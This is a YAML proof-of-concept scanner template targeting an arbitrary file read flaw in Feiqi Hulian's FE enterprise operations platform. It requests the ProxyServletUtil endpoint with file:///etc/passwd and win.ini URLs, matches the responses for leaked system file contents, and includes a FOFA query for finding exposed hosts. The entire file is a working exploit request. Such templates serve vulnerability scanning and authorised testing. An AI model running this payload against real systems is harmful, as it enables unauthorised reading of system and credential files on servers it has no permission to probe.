id: poc-yaml-flyrise-proxyservletutil-any-readfile
info:
  name: 飞企互联-FE企业运营管理平台 ProxyServletUti 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 企业运营管理平台
  fofa: app="飞企互联-FE企业运营管理平台"
variables:
  r_data_linux: 'file:///etc/passwd

    file:///c://windows/win.ini'
requests:
- method: GET
  path: /ProxyServletUtil?url={{.r_data_linux}}
  expression: "(\nstatus_code == 200 &&\ncontains(body, \"for 16-bit app support\"\
    ) && \ncontains(body,\"fonts\") &&\ncontains(body,\"extensions\")\n) || (\nstatus_code\
    \ == 200 && \nmatches(body, \"root:[x*]:0:0:\")\n)\n"
transport: http
